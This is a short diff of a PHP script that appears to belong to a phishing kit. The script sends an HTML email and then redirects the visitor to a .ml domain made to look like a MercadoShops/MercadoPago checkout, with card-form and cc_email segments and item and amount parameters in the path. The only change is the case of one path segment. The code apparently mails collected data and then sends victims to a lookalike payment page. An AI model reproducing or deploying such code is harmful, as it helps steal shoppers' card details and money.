@@ -18,7 +18,7 @@ $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: text/html; charset=utf-8\r\n"; 
 	
 if(mail($from, $asunto, $mensaje,$headers)){
-	header("Location: https://www.gamestoremercadoshopscom.ml/MPAGO/checkout_v1_payment_redirect_6a4fac9c-203d-485c-ba1a-e8b5cc9e85a9_card-form__router-request-id=15927339-fff3-438a-b003-a72c_cc_email?item_name=$item_name&amount=$amount&micc=$rest");
+	header("Location: https://www.gamestoremercadoshopscom.ml/mpago/checkout_v1_payment_redirect_6a4fac9c-203d-485c-ba1a-e8b5cc9e85a9_card-form__router-request-id=15927339-fff3-438a-b003-a72c_cc_email?item_name=$item_name&amount=$amount&micc=$rest");
 exit();
 	}
 
